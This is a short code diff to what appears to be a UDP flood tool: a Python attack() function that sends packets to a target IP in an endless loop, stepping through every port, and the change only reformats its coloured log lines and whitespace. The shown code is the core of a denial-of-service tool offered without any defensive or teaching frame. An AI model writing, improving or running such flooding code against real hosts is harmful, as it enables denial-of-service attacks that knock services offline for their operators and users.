@@ -54,7 +54,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[48;5;3m\033[38;5;0{ip}m")
+            log_message(f"\033[48;5;3m\033[38;5;0Ip Address\033[0m \033[33m{ip} \033[36mSent •> {sent} \033[94mthreads \033[37{threading.get_ident()}\r")
             log_message(f"\033[32mConflix -> \033[94m{threading.get_ident()}\033[1;31::: \033[36mSent =⟩{sent} \033[93m{ip}\033[93m:{port} \033[0;33m")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
@@ -62,7 +62,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         log_message("Attack interrupted by user.")
     except Exception as e:
         log_message(f"Error in thread {threading.get_ident()}: {e}")
-    finally:
+    finally: 
         sock.close()
 
 # Main script execution
